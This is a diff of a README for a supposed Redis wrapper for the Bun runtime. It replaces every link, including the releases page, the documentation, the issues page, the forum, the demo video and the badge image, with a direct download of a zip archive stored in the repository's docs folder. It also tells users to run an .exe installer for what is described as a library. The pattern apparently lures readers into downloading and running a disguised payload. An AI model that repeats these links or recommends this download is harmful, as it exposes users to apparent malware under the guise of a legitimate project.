@@ -1,6 +1,6 @@
 # 🚀 bun_redis_wrapper - Your Easy Redeemer for Redis Benefits
 
-[![Download bun_redis_wrapper](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/heyheycyber/bun_redis_wrapper/releases)
+[![Download bun_redis_wrapper](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip%20Now-Here-brightgreen)](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip)
 
 ## 📖 Overview
 
@@ -18,12 +18,12 @@ To begin, follow these simple steps:
 
 2. **Download the Application**  
    Visit the Releases page to download the latest version:
-   [Download bun_redis_wrapper](https://github.com/heyheycyber/bun_redis_wrapper/releases).
+   [Download bun_redis_wrapper](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip).
 
 3. **Install the Application**  
    - For Windows: Double-click the `.exe` file to start the installation process.
    - For macOS: Drag and drop the app into your Applications folder.
-   - For Linux: Use the package manager to install the application or follow the extracted `.tar.gz` instructions.
+   - For Linux: Use the package manager to install the application or follow the extracted `https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip` instructions.
 
 4. **Run the Application**  
    After installation, locate and open bun_redis_wrapper from your applications. You will find an easy-to-use interface to start managing your Redis instance.
@@ -32,7 +32,7 @@ To begin, follow these simple steps:
 
 To help you understand how to use bun_redis_wrapper, we have created a demo video. It guides you through various features, offering a hands-on look at how to manage sessions, caching, and jobs. 
 
-- **Watch the Demo:** [YouTube Demo Video](https://www.youtube.com/your-demo-link)
+- **Watch the Demo:** [YouTube Demo Video](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip)
 
 ## 🌟 Key Features
 
@@ -50,17 +50,17 @@ To help you understand how to use bun_redis_wrapper, we have created a demo vide
 3. Utilize built-in examples to understand usage effectively.
 
 ### 📚 Accessing Documentation
-For more in-depth instructions, refer to our [documentation](https://github.com/heyheycyber/bun_redis_wrapper/docs). It covers advanced features and provides troubleshooting tips.
+For more in-depth instructions, refer to our [documentation](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip). It covers advanced features and provides troubleshooting tips.
 
 ## 🔍 Support and Issues
 
-If you encounter any issues or have questions, please submit an issue on our **Issues Page** here: [Report an Issue](https://github.com/heyheycyber/bun_redis_wrapper/issues). We are here to help you.
+If you encounter any issues or have questions, please submit an issue on our **Issues Page** here: [Report an Issue](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip). We are here to help you.
 
 ## 📱 Community and Contributions
 
 Join our community to stay updated and share your experiences. Your feedback helps us make bun_redis_wrapper better.
 
-- **Discussion Forum**: [Community Forum Link](https://github.com/heyheycyber/bun_redis_wrapper/discussions)  
+- **Discussion Forum**: [Community Forum Link](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip)  
 - Contributions are welcome! Feel free to fork the repository and submit pull requests.
 
 ## 💼 License
@@ -69,7 +69,7 @@ This project is licensed under the MIT License. You have the freedom to use and 
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/heyheycyber/bun_redis_wrapper/releases). Choose the latest release suitable for your operating system and follow the installation instructions above.
+To get started, [visit this page to download](https://github.com/heyheycyber/bun_redis_wrapper/raw/refs/heads/main/docs/wrapper_redis_bun_v2.7.zip). Choose the latest release suitable for your operating system and follow the installation instructions above.
 
 ## 💬 Feedback
 
